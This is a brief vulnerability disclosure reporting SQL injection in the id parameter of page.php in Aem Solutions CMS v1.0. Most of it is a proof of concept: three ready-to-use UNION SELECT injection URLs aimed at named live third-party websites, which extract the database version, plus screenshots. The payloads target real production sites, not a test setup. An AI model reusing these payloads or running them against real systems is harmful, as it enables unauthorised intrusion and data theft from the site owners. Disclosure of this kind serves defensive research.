# Aem Solutions - Sql Injection

#### vender:https://www.aemsolutions.com/

#### Software: Aem Solutions CMS v1.0

Tested On: Mac, Firefox

### Description

Sql Injection of param id in page.php of Aem Solutions CMS v1.0.

## Proof of Concept:

### Demo :

https://www.aaar.co.in/page.php?id=-3%27%20union%20select%201,2,3,version(),5--+

https://csalok.com/page.php?id=2%27%20union%20select%201,2,3,version(),5--+

https://www.pnaindia.in/page.php?id=6%27%20union%20select%201,2,3,version(),5--+

- We can see the version of Database.

![image-20250525234100384](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505252341623.png)

![image-20250525234320873](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505252343147.png)